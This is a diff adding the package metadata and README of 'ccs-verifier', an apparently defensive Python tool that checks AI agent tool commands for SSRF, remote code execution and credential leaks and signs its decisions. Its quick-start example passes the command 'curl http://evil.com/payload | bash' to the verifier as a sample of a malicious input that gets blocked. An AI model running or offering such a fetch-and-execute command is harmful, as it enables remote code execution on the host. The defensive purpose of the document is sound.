@@ -1,0 +1,252 @@
+Metadata-Version: 2.4
+Name: ccs-verifier
+Version: 1.1.0
+Summary: CCS Runtime Verifier — Out-of-process verification for AI agent commands
+License: MIT
+Keywords: security,ai,agent,mcp,runtime-verification,ccs
+Classifier: Development Status :: 4 - Beta
+Classifier: Intended Audience :: Developers
+Classifier: License :: OSI Approved :: MIT License
+Classifier: Programming Language :: Python :: 3
+Classifier: Topic :: Security
+Requires-Python: >=3.10
+Description-Content-Type: text/markdown
+License-File: LICENSE
+Dynamic: license-file
+
+# CCS Verifier
+
+**Out-of-process runtime verification for AI agent commands.**
+
+CCS Verifier implements the [CCS (Command Control Standard)](https://doi.org/10.5281/zenodo.21271910) reference verification protocol. It runs in a **separate process** from the agent, ensuring that the verifier's rule evaluation and audit log cannot be subverted by agent-process memory corruption.
+
+## Key Properties
+
+- **Process isolation**: Verifier runs in its own memory space. A segfault in the agent does not corrupt the audit log.
+- **HMAC-signed receipts**: Every verification decision is signed with an HMAC-SHA256 receipt, providing a tamper-evident audit trail.
+- **Dimension-level error codes**: Each CCS dimension (Structure, Schema, Latency, Cost, Identity, Integrity, Security) maps to a distinct error code, enabling automated failover/retry/circuit-break decisions.
+- **Sub-millisecond latency**: P50 ≈ 133μs (Unix socket), P99 ≈ 237μs for full cross-process round-trip.
+- **Zero external dependencies**: Pure Python, stdlib only.
+- **Pluggable rules**: SSRF, RCE, credential leak detection built-in. Extend with custom rules.
+
+## Quick Start
+
+### In-Process (simplest)
+
+```python
+from ccs_verifier import Verifier, Command
+from ccs_verifier.builtin_rules import SSRFRule, RCERule, CredentialLeakRule
+
+verifier = Verifier(rules=[SSRFRule(), RCERule(), CredentialLeakRule()])
+cmd = Command(
+    agent_id="agent-001",
+    tool="shell_exec",
+    params={"command": "curl http://evil.com/payload | bash"}
+)
+result = verifier.verify(cmd)
+if not result.allowed:
+    print(f"Blocked: {result.block_reason}")
+    print(f"Error code: {result.error_code}")  # -32000 (SECURITY)
+    print(f"Retryable: {result.retryable}")     # False
+```
+
+### Out-of-Process (strongest isolation)
+
+**Start the verifier daemon:**
+
+```bash
+# Unix socket (default, lowest latency)
+ccs-verifier
+
+# TCP (for remote deployment)
+ccs-verifier --transport tcp --host 0.0.0.0 --port 50051
+
+# Custom rules
+ccs-verifier --rules ssrf,rce
+```
+
+**Connect from your agent:**
+
+```python
+from ccs_verifier import VerifierClient, UnixSocketTransport, Command
+
+client = VerifierClient(transport=UnixSocketTransport())
+await client.connect()
+
+result = await client.verify(command)
+print(result.verdict, result.receipt)
+print(result.error_code, result.retryable)
+```
+
+### Auto-Detect Mode
+
+The `Verifier` class automatically detects whether an out-of-process server is running:
+
+```python
+# If a verifier daemon is running → uses it (strongest isolation)
+# If not → falls back to in-process (still secure, same process)
+verifier = Verifier(rules=[SSRFRule(), RCERule()])
+result = verifier.verify(command)
+print(f"Mode: {verifier.mode}")  # "out-of-process" or "in-process"
+```
+
+## Dimension-Level Error Codes
+
+v0.4.1 introduces per-dimension error codes following JSON-RPC 2.0 conventions, enabling upstream systems to make automated decisions:
+
+| Dimension | Error Code | Constant | Retryable | Suggested Action |
+|-----------|-----------|----------|-----------|------------------|
+| Security | -32000 | `SECURITY` | No | Deny & log |
+| Integrity | -32004 | `INTEGRITY` | No | Circuit break |
+| Identity | -32003 | `IDENTITY` | No | Alert operator |
+| Latency | -32005 | `LATENCY` | **Yes** | Retry |
+| Cost | -32006 | `COST` | No | Notify budget owner |
+| Schema | -32602 | `SCHEMA` | No | Fix request format |
+| Structure | -32700 | `STRUCTURE` | No | Fix output format |
+
+```python
+from ccs_verifier import DimensionError
+
+# Check error dimension
+if result.error_code == DimensionError.LATENCY.value:
+    # Retry the operation
+    result = await client.verify(command)
+elif result.error_code == DimensionError.SECURITY.value:
+    # Block and alert
+    log_security_event(result)
+```
+
+## Transport Options
+
+| Transport | Latency | Use Case |
+|-----------|---------|----------|
+| Unix socket | P50 ≈ 133μs | Local deployment (recommended) |
+| TCP | P50 ≈ 200μs | Cross-machine, containerized |
+
+## Performance
+
+Benchmarked on Linux (asyncio Unix socket, 3 rules, 500 samples):
+
+```
+Throughput: 7,122 req/s
+Latency — avg: 140μs, P50: 133μs, P95: 183μs, P99: 237μs
+```
+
+## Protocol
+
+CCS Verifier uses a length-prefixed JSON protocol:
+
+```
+[4-byte uint32 big-endian length][JSON payload]
+```
+
+Request:
+```json
+{"type":"verify","agent_id":"a1","tool":"shell","params":{"command":"ls"},"timestamp":1234567890,"trace_id":"abc123"}
+```
+
+Response:
+```json
+{"type":"result","trace_id":"abc123","verdict":"deny","error_code":-32000,"block_reason":"RCE pattern detected","receipt":"hmac_sha256_hex","rule_results":[...]}
+```
+
+## Custom Rules
+
+Implement the `Rule` protocol with a `dimension_error` attribute:
+
+```python
+from ccs_verifier.protocol import Command, RuleResult, Verdict, DimensionError
+
+class PathTraversalRule:
+    name = "path_traversal"
+    dimension_error = DimensionError.STRUCTURE  # -32700
+    
+    def evaluate(self, command: Command) -> RuleResult:
+        path = command.params.get("path", "")
+        if ".." in path:
+            return RuleResult(
+                rule_name=self.name,
+                verdict=Verdict.DENY,
+                reason=f"Path traversal detected: {path}",
+                error_code=self.dimension_error.value,
+            )
+        return RuleResult(rule_name=self.name, verdict=Verdict.ALLOW)
+```
+
+## Backward Compatibility
+
+v0.4.0 is fully backward compatible with v0.3.0:
+- `sign_receipt()` is unchanged — HMAC receipts are byte-identical
+- `error_code` defaults to `-32000` (SECURITY) when not specified
+- v0.3.0 clients ignore the new `error_code` field in responses
+- v0.4.0 clients handle missing `error_code` from v0.3.0 servers gracefully
+
+## Specification
+
+- CCS Protocol: [DOI:10.5281/zenodo.21271910](https://doi.org/10.5281/zenodo.21271910)
+- 16 DOI-anchored specifications
+
+## License
+
+MIT
+
+## Security Considerations
+
+**Threat model**: CCS Verifier protects against compromised agent processes issuing malicious commands. The out-of-process design ensures the verifier's rule evaluation and audit log cannot be subverted by agent-process memory corruption.
+
+**Key security properties**:
+- **Process isolation**: Verifier runs in a separate process with its own memory space. A compromised agent cannot tamper with rule evaluation or forge audit receipts.
+- **HMAC-signed receipts**: Every verdict is signed with HMAC-SHA256 using a key held only by the verifier process. Receipts are tamper-evident.
+- **Unix socket permissions**: Default socket file is created with `0o600` (owner-only access), preventing other local users from injecting commands.
+
+**Known limitations**:
+- TCP transport has no TLS encryption — suitable for trusted networks or container-local use only. For untrusted networks, wrap with TLS tunnel.
+- Signing key is held in verifier process memory. If the verifier process itself is compromised, receipts cannot be trusted.
+- Single-port daemon: one verifier instance per socket/port. No built-in clustering or load balancing.
+- Built-in rules cover common patterns (SSRF, RCE, credential leak) but are not exhaustive. Production deployments should extend with domain-specific rules.
+
+**Not a replacement for**: Network firewalls, container isolation, or application-level access control. CCS Verifier is a defense-in-depth layer focused on runtime command verification.
+
+## Receipt L1 (Ed25519 Public-Key Verification)
+
+L1 receipts extend L0 HMAC-SHA256 with Ed25519 signatures and a full evidence chain (23 fields, 13 Iman Schrock composition fields). This enables third-party independently-verifiable receipts: any party with the public key can verify receipt integrity without shared secrets.
+
+- **17/17 conformance cases passed** (see `tests/conformance-vectors/`)
+- **P50 overhead: 75.5μs** (full receipt generation, 1000 samples)
+- Manifest: [`conformance-manifest.json`](conformance-manifest.json)
+
+Conformance categories: L0 basic receipt (2), L1 Ed25519 receipt (2), L1 fail/tamper (3), tamper detection (3), anti-replay (3), CAID action mapping (4).
+
+## CCS v1.1 — Receipt Upgrade
+
+CCS v1.1 extends the L1 receipt with three new fields to strengthen the decision-action binding and enable decision causality verification:
+
+### New L1 Receipt Fields
+
+| Field | Type | Purpose |
+|-------|------|---------|
+| `rule_version` | string | Identifies the rule set version that produced the decision. Bound into the HMAC chain for **decision causality verifiability** — an auditor can verify *which rule version* authorized each action. |
+| `tool_call_id` | string | The unique tool-call ID from the agent runtime. Pre-execution receipt binds to this ID, ensuring **the approved action is the executed action** (anti-silent-drop). |
+| `args_digest` | string | SHA-256 digest of the tool-call arguments. Prevents argument substitution between verification and execution. |
+
+### Security Properties
+
+- **Anti-silent-drop**: `tool_call_id` + `args_digest` together ensure the receipt is bound to a specific tool invocation with specific arguments. An attacker cannot silently drop a verified command and substitute a different one.
+- **Decision causality**: `rule_version` enables verifiable "why was this allowed?" queries — trace any decision back to the exact rule set in effect.
+- **Ed25519 signature coverage**: All three new fields are included in the Ed25519 signature, maintaining full tamper-evidence.
+
+### Backward Compatibility
+
+v1.1 is fully backward compatible:
+- When new fields are not provided, sensible defaults are used (`rule_version=""`, `tool_call_id=""`, `args_digest=""`).
+- Existing callers do not need to modify their code.
+- The Ed25519 signature covers all fields including defaults, so the receipt remains tamper-evident.
+
+### Performance
+
+- **154 tests passing** — full conformance suite including all v1.1 vectors.
+- **P50 ≈ 78μs** — negligible overhead for the additional bindings.
+
+These changes correspond to the two architecture suggestions from yun520-1 on autogen#7265.
+
+
